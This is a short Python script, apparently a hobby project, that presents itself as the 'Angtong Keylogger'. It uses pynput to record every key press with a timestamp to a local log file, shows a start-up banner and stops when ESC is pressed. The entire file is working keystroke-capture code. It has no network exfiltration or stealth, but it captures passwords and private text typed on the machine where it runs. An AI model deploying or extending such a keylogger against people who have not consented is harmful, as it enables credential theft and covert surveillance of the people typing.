import logging
import sys
from pynput.keyboard import Key, Listener
from datetime import datetime

# --- Configuration ---
LOG_FILE = "angtong_log.txt"

# --- Banner Function ---
def print_banner():
    art = r"""
    _                _                   
   / \   _ __   __ _| |_ ___  _ __   __ _ 
  / _ \ | '_ \ / _` | __/ _ \| '_ \ / _` |
 / ___ \| | | | (_| | || (_) | | | | (_| |
/_/   \_\_| |_|\__, |\__\___/|_| |_|\__, |
               |___/                |___/ 
    """
    print(art)
    print("-" * 50)
    print(">> Angtong Keylogger Started")
    print(f">> Time: {datetime.now()}")
    print(f">> Logging to: {LOG_FILE}")
    print("-" * 50)
    print("Press 'ESC' to stop logging safely.")

# --- Setup Logging ---
# formatting: timestamp -> key pressed
logging.basicConfig(
    filename=LOG_FILE, 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    """
    Callback function that runs every time a key is pressed.
    """
    try:
        # Log the key to the file
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """
    Callback function that runs when a key is released.
    Used here as a Kill Switch.
    """
    if key == Key.esc:
        print("\n[!] ESC pressed. Stopping Angtong Keylogger...")
        return False

# --- Main Execution ---
if __name__ == "__main__":
    print_banner()

    # Start the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
